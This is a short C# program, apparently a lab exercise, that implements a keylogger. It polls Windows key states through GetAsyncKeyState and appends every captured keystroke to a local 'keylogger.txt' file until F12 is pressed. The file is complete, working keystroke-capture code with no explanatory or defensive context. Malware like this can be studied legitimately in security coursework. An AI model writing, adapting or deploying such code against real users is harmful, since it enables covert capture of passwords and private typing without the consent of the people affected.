using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Lab_4
{
    static class Program
    {
        [STAThread]
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(String[] args)
        {
            String buf = "";

            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        if (((Keys)i) == Keys.Enter)
                        {
                            buf += "\r\n";
                            continue;
                        }
                        if (((Keys)i) == Keys.Space)
                        {
                            buf += " ";
                            continue;
                        }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton)
                        {

                            continue;
                        }
                        if (((Keys)i).ToString().Length == 1)
                        {
                            buf += ((Keys)i).ToString();
                        }
                        else
                        {
                            buf += $"<{((Keys)i).ToString()}>";
                        }
                        if (buf.Length > 10)
                        {
                            File.AppendAllText("keylogger.txt", buf);
                            buf = "";
                        }
                        if (((Keys)i) == Keys.F12)
                        {
                            Environment.Exit(0);
                        }
                    }
                }
            }
        }
    }
}
